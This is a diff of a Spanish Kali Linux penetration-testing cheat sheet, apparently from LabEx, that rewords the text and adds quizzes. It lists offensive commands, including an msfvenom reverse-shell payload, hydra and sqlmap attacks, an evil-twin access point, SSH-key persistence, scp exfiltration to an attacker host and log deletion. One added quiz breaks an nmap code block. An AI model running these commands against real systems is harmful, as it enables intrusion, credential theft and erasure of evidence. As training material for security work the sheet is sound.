@@ -1,6 +1,6 @@
 ---
-title: 'Hoja de Trucos de Kali Linux'
-description: 'Aprenda Kali Linux con nuestra hoja de trucos completa que cubre comandos esenciales, conceptos y mejores prácticas.'
+title: 'Hoja de Trucos de Kali Linux | LabEx'
+description: 'Aprenda pruebas de penetración con Kali Linux con esta hoja de trucos completa. Referencia rápida para herramientas de seguridad, hacking ético, escaneo de vulnerabilidades, explotación y pruebas de ciberseguridad.'
 pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
 ---
 
@@ -12,18 +12,18 @@ Hoja de Trucos de Kali Linux
 
 <base-disclaimer>
 <base-disclaimer-title>
-<a target="_blank" href="https://labex.io/es/learn/kali">Aprende Kali Linux con Laboratorios Prácticos</a>
+<a target="_blank" href="https://labex.io/es/learn/kali">Aprenda Kali Linux con Laboratorios Prácticos</a>
 </base-disclaimer-title>
 <base-disclaimer-content>
-Aprende pruebas de penetración con Kali Linux a través de laboratorios prácticos y escenarios del mundo real. LabEx ofrece cursos completos de Kali Linux que cubren comandos esenciales, escaneo de redes, evaluación de vulnerabilidades, ataques de contraseñas, pruebas de aplicaciones web y forense digital. Domina las técnicas de hacking ético y las herramientas de auditoría de seguridad.
+Aprenda pruebas de penetración con Kali Linux a través de laboratorios prácticos y escenarios del mundo real. LabEx ofrece cursos completos de Kali Linux que cubren comandos esenciales, escaneo de redes, evaluación de vulnerabilidades, ataques de contraseñas, pruebas de aplicaciones web y forense digital. Domine las técnicas de hacking ético y las herramientas de auditoría de seguridad.
 </base-disclaimer-content>
 </base-disclaimer>
 
-## Configuración y Configuración del Sistema
+## Configuración y Puesta a Punto del Sistema
 
 ### Configuración Inicial: `sudo apt update`
 
-Actualiza los paquetes y repositorios del sistema para un rendimiento óptimo.
+Actualice los paquetes y repositorios del sistema para un rendimiento óptimo.
 
 ```bash
 # Actualizar repositorio de paquetes
@@ -38,7 +38,7 @@ sudo apt install curl wget git
 
 ### Gestión de Usuarios: `sudo useradd`
 
-Crea y gestiona cuentas de usuario para pruebas de seguridad.
+Cree y gestione cuentas de usuario para pruebas de seguridad.
 
 ```bash
 # Añadir nuevo usuario
@@ -53,14 +53,14 @@ su - username
 
 ### Gestión de Servicios: `systemctl`
 
-Controla los servicios y demonios del sistema para escenarios de prueba.
+Controle los servicios y demonios del sistema para escenarios de prueba.
 
 ```bash
 # Iniciar servicio
 sudo systemctl start apache2
 # Detener servicio
 sudo systemctl stop apache2
-# Habilitar servicio al inicio
+# Habilitar servicio al arranque
 sudo systemctl enable ssh
 # Comprobar estado del servicio
 sudo systemctl status postgresql
@@ -68,7 +68,7 @@ sudo systemctl status postgresql
 
 ### Configuración de Red: `ifconfig`
 
-Configura interfaces de red para pruebas de penetración.
+Configure las interfaces de red para pruebas de penetración.
 
 ```bash
 # Mostrar interfaces de red
@@ -83,7 +83,7 @@ sudo ifconfig wlan0 up
 
 ### Variables de Entorno: `export`
 
-Configura variables de entorno y rutas para el entorno de prueba.
+Configure variables de entorno y rutas para el entorno de prueba.
 
 ```bash
 # Establecer IP objetivo
@@ -94,9 +94,24 @@ export WORDLIST=/usr/share/wordlists/rockyou.txt
 env | grep TARGET
 ```
 
+<BaseQuiz id="kali-env-1" correct="C">
+  <template #question>
+    ¿Qué sucede con las variables de entorno establecidas con `export`?
+  </template>
+  
+  <BaseQuizOption value="A">Persisten a través de reinicios del sistema</BaseQuizOption>
+  <BaseQuizOption value="B">Solo están disponibles en el archivo actual</BaseQuizOption>
+  <BaseQuizOption value="C" correct>Están disponibles para el shell actual y los procesos hijos</BaseQuizOption>
+  <BaseQuizOption value="D">Son variables globales del sistema</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Las variables de entorno establecidas con `export` están disponibles para la sesión de shell actual y todos los procesos hijos generados a partir de ella. Se pierden cuando finaliza la sesión del shell a menos que se añadan a archivos de configuración del shell como `.bashrc`.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### Instalación de Herramientas: `apt install`
 
-Instala herramientas de seguridad adicionales y dependencias.
+Instale herramientas de seguridad adicionales y dependencias.
 
 ```bash
 # Instalar herramientas adicionales
@@ -111,7 +126,7 @@ pip3 install --user tool-name
 
 ### Descubrimiento de Hosts: `nmap -sn`
 
-Identifica hosts activos en la red usando barridos de ping.
+Identifique hosts activos en la red utilizando barridos de ping.
 
 ```bash
 # Barrido de ping
@@ -126,7 +141,7 @@ masscan --ping 192.168.1.0/24
 
 ### Escaneo de Puertos: `nmap`
 
-Escanea puertos abiertos y servicios en ejecución en sistemas objetivo.
+Escanee puertos abiertos y servicios en ejecución en sistemas objetivo.
 
 ```bash
 # Escaneo TCP básico
@@ -139,16 +154,47 @@ nmap -sU 192.168.1.1
 nmap -sS 192.168.1.1
 ```
 
+<BaseQuiz id="kali-nmap-1" correct="B">
+  <template #question>
+    ¿Qué hace `nmap -sS`?
+  </template>
+  
+  <BaseQuizOption value="A">Realiza un escaneo UDP</BaseQuizOption>
+  <BaseQuizOption value="B" correct>Realiza un escaneo SYN sigiloso (escaneo medio abierto)</BaseQuizOption>
+  <BaseQuizOption value="C">Escanea todos los puertos</BaseQuizOption>
+  <BaseQuizOption value="D">Realiza detección de SO</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    El indicador `-sS` realiza un escaneo SYN (también llamado escaneo medio abierto) porque nunca completa el handshake TCP. Envía paquetes SYN y analiza las respuestas, haciéndolo más sigiloso que un escaneo de conexión TCP completo.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### Enumeración de Servicios: `nmap -sV`
 
-Identifica versiones de servicios y vulnerabilidades potenciales.
+Identifique versiones de servicios y vulnerabilidades potenciales.
 
 ```bash
 # Detección de versión
 nmap -sV 192.168.1.1
 # Detección de SO
 nmap -O 192.168.1.1
-# Escaneo de scripts
+```
+
+<BaseQuiz id="kali-enumeration-1" correct="A">
+  <template #question>
+    ¿Qué hace `nmap -sV`?
+  </template>
+  
+  <BaseQuizOption value="A" correct>Detecta versiones de servicios en puertos abiertos</BaseQuizOption>
+  <BaseQuizOption value="B">Escanea solo puertos de control de versión</BaseQuizOption>
+  <BaseQuizOption value="C">Muestra solo servicios vulnerables</BaseQuizOption>
+  <BaseQuizOption value="D">Realiza solo detección de SO</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    El indicador `-sV` habilita la detección de versiones, que sondea los puertos abiertos para determinar qué servicio y versión se están ejecutando. Esto es útil para identificar vulnerabilidades potenciales asociadas con versiones de software específicas.
+  </BaseQuizAnswer>
+</BaseQuiz>
+# Escaneo con scripts
 nmap -sC 192.168.1.1
 # Escaneo exhaustivo
 nmap -sS -sV -O -A 192.168.1.1
@@ -158,7 +204,7 @@ nmap -sS -sV -O -A 192.168.1.1
 
 ### Enumeración DNS: `dig`
 
-Recopila información DNS y realiza transferencias de zona.
+Recopile información DNS y realice transferencias de zona.
 
 ```bash
 # Búsqueda DNS básica
@@ -173,7 +219,7 @@ dnsrecon -d example.com
 
 ### Reconocimiento Web: `dirb`
 
-Descubre directorios y archivos ocultos en servidores web.
+Descubra directorios y archivos ocultos en servidores web.
 
 ```bash
 # Fuerza bruta de directorios
@@ -186,7 +232,7 @@ gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-l
 
 ### Información WHOIS: `whois`
 
-Recopila información de registro y propiedad de dominios.
+Recopile información de registro y propiedad de dominios.
 
 ```bash
 # Búsqueda WHOIS
@@ -199,7 +245,7 @@ theharvester -d example.com -l 100 -b google
 
 ### Análisis SSL/TLS: `sslscan`
 
-Analiza la configuración y vulnerabilidades de SSL/TLS.
+Analice la configuración y vulnerabilidades de SSL/TLS.
 
 ```bash
 # Escaneo SSL
@@ -212,7 +258,7 @@ openssl s_client -connect example.com:443
 
 ### Enumeración SMB: `enum4linux`
 
-Enumera recursos compartidos SMB e información NetBIOS.
+Enumere recursos compartidos SMB e información NetBIOS.
 
 ```bash
 # Enumeración SMB
@@ -227,7 +273,7 @@ nmap --script smb-vuln* 192.168.1.1
 
 ### Enumeración SNMP: `snmpwalk`
 
-Recopila información del sistema a través del protocolo SNMP.
+Recopile información del sistema a través del protocolo SNMP.
 
 ```bash
 # SNMP walk
@@ -242,7 +288,7 @@ snmp-check 192.168.1.1
 
 ### Escaneo de Vulnerabilidades: `nessus`
 
-Identifica vulnerabilidades de seguridad utilizando escáneres automatizados.
+Identifique vulnerabilidades de seguridad utilizando escáneres automatizados.
 
 ```bash
 # Iniciar servicio Nessus
@@ -255,9 +301,9 @@ nikto -h http://192.168.1.1
 sqlmap -u "http://example.com/page.php?id=1"
 ```
 
-### Metasploit Framework: `msfconsole`
+### Framework Metasploit: `msfconsole`
 
-Lanza exploits y gestiona campañas de pruebas de penetración.
+Lance exploits y gestione campañas de pruebas de penetración.
 
 ```bash
 # Iniciar Metasploit
@@ -272,18 +318,18 @@ set RHOSTS 192.168.1.1
 
 ### Pruebas de Desbordamiento de Búfer: `pattern_create`
 
-Genera patrones para la explotación de desbordamiento de búfer.
+Genere patrones para la explotación de desbordamiento de búfer.
 
 ```bash
 # Crear patrón
 pattern_create.rb -l 400
-# Encontrar offset
+# Encontrar desplazamiento
 pattern_offset.rb -l 400 -q EIP_value
 ```
 
 ### Desarrollo de Exploits Personalizados: `msfvenom`
 
-Crea payloads personalizados para objetivos específicos.
+Cree cargas útiles personalizadas para objetivos específicos.
 
 ```bash
 # Generar shellcode
@@ -298,7 +344,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > 
 
 ### Ataques de Fuerza Bruta: `hydra`
 
-Realiza ataques de fuerza bruta de inicio de sesión contra varios servicios.
+Realice ataques de fuerza bruta de inicio de sesión contra varios servicios.
 
 ```bash
 # Fuerza bruta SSH
@@ -311,7 +357,7 @@ hydra -L users.txt -P passwords.txt ftp://192.168.1.1
 
 ### Descifrado de Hashes: `hashcat`
 
-Descifra hashes de contraseñas utilizando aceleración por GPU.
+Descifre hashes de contraseñas utilizando aceleración por GPU.
 
 ```bash
 # Descifrado de hash MD5
@@ -339,7 +385,7 @@ john --rules --wordlist=passwords.txt shadow.txt
 
 ### Generación de Listas de Palabras: `crunch`
 
-Crea listas de palabras personalizadas para ataques dirigidos.
+Cree listas de palabras personalizadas para ataques dirigidos.
 
 ```bash
 # Generar lista de palabras de 4 a 8 caracteres
@@ -354,7 +400,7 @@ crunch 8 8 -t @@@@%%%% -o mixed.txt
 
 ### Configuración del Modo Monitor: `airmon-ng`
 
-Configura el adaptador inalámbrico para captura de paquetes e inyección.
+Configure el adaptador inalámbrico para la captura de paquetes e inyección.
 
 ```bash
 # Habilitar modo monitor
@@ -367,12 +413,12 @@ sudo airmon-ng stop wlan0mon
 
 ### Descubrimiento de Redes: `airodump-ng`
 
-Descubre y monitorea redes inalámbricas y clientes.
+Descubra y monitoree redes inalámbricas y clientes.
 
 ```bash
 # Escanear todas las redes
 sudo airodump-ng wlan0mon
-# Red específica
+# Dirigirse a una red específica
 sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
 # Mostrar solo redes WEP
 sudo airodump-ng --encrypt WEP wlan0mon
@@ -380,7 +426,7 @@ sudo airodump-ng --encrypt WEP wlan0mon
 
 ### Ataques WPA/WPA2: `aircrack-ng`
 
-Realiza ataques contra redes cifradas WPA/WPA2.
+Realice ataques contra redes cifradas WPA/WPA2.
 
 ```bash
 # Ataque de desautenticación
@@ -391,12 +437,12 @@ aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
 reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
 ```
 
-### Ataque de Punto de Acceso Maligno (Evil Twin): `hostapd`
+### Ataque de Doble Trampa (Evil Twin): `hostapd`
 
-Crea puntos de acceso falsos para la recolección de credenciales.
+Cree puntos de acceso no autorizados para la recolección de credenciales.
 
 ```bash
-# Iniciar AP malicioso
+# Iniciar AP no autorizado
 sudo hostapd hostapd.conf
 # Servicio DHCP
 sudo dnsmasq -C dnsmasq.conf
@@ -408,7 +454,7 @@ ettercap -T -M arp:remote /192.168.1.0/24//
 
 ### Pruebas de Inyección SQL: `sqlmap`
 
-Detección y explotación automatizada de inyección SQL.
+Detección y explotación automatizadas de inyección SQL.
 
 ```bash
 # Prueba básica de inyección SQL
@@ -423,38 +469,38 @@ sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
 
 ### Cross-Site Scripting: `xsser`
 
-Prueba vulnerabilidades XSS en aplicaciones web.
+Pruebe vulnerabilidades XSS en aplicaciones web.
 
 ```bash
-# Prueba XSS
+# Pruebas XSS
 xsser --url "http://example.com/search.php?q=XSS"
-# Detección XSS automatizada
+# Detección automatizada de XSS
 xsser -u "http://example.com" --crawl=10
-# Payload personalizado
+# Carga útil personalizada
 xsser --url "http://example.com" --payload="<script>alert(1)</script>"
 ```
 
 ### Integración con Burp Suite: `burpsuite`
 
-Plataforma integral para pruebas de seguridad de aplicaciones web.
+Plataforma integral de pruebas de seguridad de aplicaciones web.
 
 ```bash
 # Iniciar Burp Suite
 burpsuite
 # Configurar proxy (127.0.0.1:8080)
-# Configurar el navegador para capturar tráfico
+# Configurar el proxy del navegador para capturar tráfico
 # Usar Intruder para ataques automatizados
 # Usar Spider para descubrimiento de contenido
 ```
 
 ### Recorrido de Directorios: `wfuzz`
 
-Prueba vulnerabilidades de recorrido de directorios e inclusión de archivos.
+Pruebe vulnerabilidades de recorrido de directorios e inclusión de archivos.
 
 ```bash
-# Fuzzing de directorios
+# Fuerza bruta de directorios
 wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
-# Fuzzing de parámetros
+# Fuerza bruta de parámetros
 wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
 ```
 
@@ -462,7 +508,7 @@ wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
 
 ### Enumeración del Sistema: `linpeas`
 
-Enumeración automatizada para escalada de privilegios en sistemas Linux.
+Enumeración automatizada de escalada de privilegios para sistemas Linux.
 
 ```bash
 # Descargar LinPEAS
@@ -476,7 +522,7 @@ chmod +x linpeas.sh
 
 ### Mecanismos de Persistencia: `crontab`
 
-Establece persistencia en sistemas comprometidos.
+Establecer persistencia en sistemas comprometidos.
 
 ```bash
 # Editar crontab
@@ -489,7 +535,7 @@ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
 
 ### Exfiltración de Datos: `scp`
 
-Transfiere datos de forma segura desde sistemas comprometidos.
+Transfiera datos de forma segura desde sistemas comprometidos.
 
 ```bash
 # Copiar archivo a la máquina del atacante
@@ -503,15 +549,15 @@ python3 -m http.server 8000
 
 ### Cubrir Huellas: `history`
 
-Elimina evidencia de actividades en sistemas comprometidos.
+Elimine evidencia de actividades en sistemas comprometidos.
 
 ```bash
-# Limpiar historial de bash
+# Borrar historial de bash
 history -c
 unset HISTFILE
-# Eliminar entradas específicas
+# Borrar entradas específicas
 history -d line_number
-# Limpiar logs del sistema
+# Borrar registros del sistema
 sudo rm /var/log/auth.log*
 ```
 
@@ -519,7 +565,7 @@ sudo rm /var/log/auth.log*
 
 ### Creación de Imágenes de Disco: `dd`
 
-Crea imágenes forenses de dispositivos de almacenamiento.
+Cree imágenes forenses de dispositivos de almacenamiento.
 
 ```bash
 # Crear imagen de disco
@@ -534,7 +580,7 @@ sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
 
 ### Recuperación de Archivos: `foremost`
 
-Recupera archivos eliminados de imágenes de disco o unidades.
+Recupere archivos eliminados de imágenes de disco o unidades.
 
 ```bash
 # Recuperar archivos de la imagen
@@ -547,7 +593,7 @@ photorec evidence.img
 
 ### Análisis de Memoria: `volatility`
 
-Analiza volcados de RAM en busca de evidencia forense.
+Analice volcados de RAM en busca de evidencia forense.
 
 ```bash
 # Identificar perfil del SO
@@ -560,7 +606,7 @@ volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
 
 ### Análisis de Paquetes de Red: `wireshark`
 
-Analiza capturas de tráfico de red en busca de evidencia forense.
+Analice capturas de tráfico de red en busca de evidencia forense.
 
 ```bash
 # Iniciar Wireshark
@@ -575,7 +621,7 @@ foremost -i capture.pcap -o extracted/
 
 ### Captura de Pantallas: `gnome-screenshot`
 
-Documenta hallazgos con captura de pantalla sistemática.
+Documente los hallazgos con captura de pantalla sistemática.
 
 ```bash
 # Captura de pantalla completa
@@ -588,9 +634,9 @@ gnome-screenshot -d 5 -f delayed.png
 gnome-screenshot -a -f area.png
 ```
 
-### Gestión de Logs: `script`
+### Gestión de Registros: `script`
 
-Graba sesiones de terminal con fines de documentación.
+Grabe sesiones de terminal con fines de documentación.
 
 ```bash
 # Iniciar grabación de sesión
@@ -603,7 +649,7 @@ scriptreplay session.time session.log
 
 ### Plantillas de Informes: `reportlab`
 
-Genera informes profesionales de pruebas de penetración.
+Genere informes profesionales de pruebas de penetración.
 
 ```bash
 # Instalar herramientas de informes
@@ -616,7 +662,7 @@ pandoc report.md -o report.pdf
 
 ### Integridad de la Evidencia: `sha256sum`
 
-Mantiene la cadena de custodia con hashes criptográficos.
+Mantenga la cadena de custodia con hashes criptográficos.
 
 ```bash
 # Generar sumas de verificación
@@ -631,7 +677,7 @@ find /evidence -type f -exec sha256sum {} \; > all_files.sha256
 
 ### Gestión de Paquetes: `apt`
 
-Mantiene y actualiza paquetes del sistema y herramientas de seguridad.
+Mantenga y actualice los paquetes del sistema y las herramientas de seguridad.
 
 ```bash
 # Actualizar listas de paquetes
@@ -646,7 +692,7 @@ sudo apt autoremove
 
 ### Actualizaciones del Kernel: `uname`
 
-Monitorea y actualiza el kernel del sistema para parches de seguridad.
+Supervise y actualice el kernel del sistema para parches de seguridad.
 
 ```bash
 # Comprobar kernel actual
@@ -661,7 +707,7 @@ sudo apt autoremove --purge
 
 ### Verificación de Herramientas: `which`
 
-Verifica instalaciones de herramientas y localiza ejecutables.
+Verifique las instalaciones de herramientas y localice ejecutables.
 
 ```bash
 # Localizar herramienta
@@ -674,7 +720,7 @@ ls /usr/bin/ | grep -i security
 
 ### Monitoreo de Recursos: `htop`
 
-Monitorea los recursos del sistema durante pruebas de seguridad intensivas.
+Monitoree los recursos del sistema durante pruebas de seguridad intensivas.
 
 ```bash
 # Visor de procesos interactivo
@@ -691,7 +737,7 @@ netstat -tulnp
 
 ### Crear Alias: `.bashrc`
 
-Configura atajos de comandos para ahorrar tiempo en tareas frecuentes.
+Configure atajos de comandos para ahorrar tiempo en tareas frecuentes.
 
 ```bash
 # Editar bashrc
@@ -707,14 +753,14 @@ source ~/.bashrc
 
 ### Funciones Personalizadas: `function`
 
-Crea combinaciones de comandos avanzadas para flujos de trabajo comunes.
+Cree combinaciones de comandos avanzadas para flujos de trabajo comunes.
 
 ```bash
 # Función de escaneo rápido nmap
 function qscan() {
     nmap -sS -sV -O $1
 }
-# Configuración de entorno para compromisos
+# Configuración de pruebas de penetración
 function pentest-setup() {
     mkdir -p {recon,scans,exploits,loot}
 }
@@ -722,7 +768,7 @@ function pentest-setup() {
 
 ### Atajos de Teclado: Terminal
 
-Domina los atajos de teclado esenciales para una navegación más rápida.
+Domine los atajos de teclado esenciales para una navegación más rápida.
 
 ```bash
 # Atajos de terminal
@@ -731,12 +777,12 @@ Domina los atajos de teclado esenciales para una navegación más rápida.
 # Ctrl+L - Limpiar pantalla
 # Ctrl+R - Buscar en el historial de comandos
 # Tab - Autocompletar comandos
-# Arriba/Abajo - Navegar historial de comandos
+# Arriba/Abajo - Navegar por el historial de comandos
 ```
 
 ### Configuración del Entorno: `tmux`
 
-Configura sesiones de terminal persistentes para tareas de larga duración.
+Configure sesiones de terminal persistentes para tareas de larga duración.
 
 ```bash
 # Iniciar nueva sesión
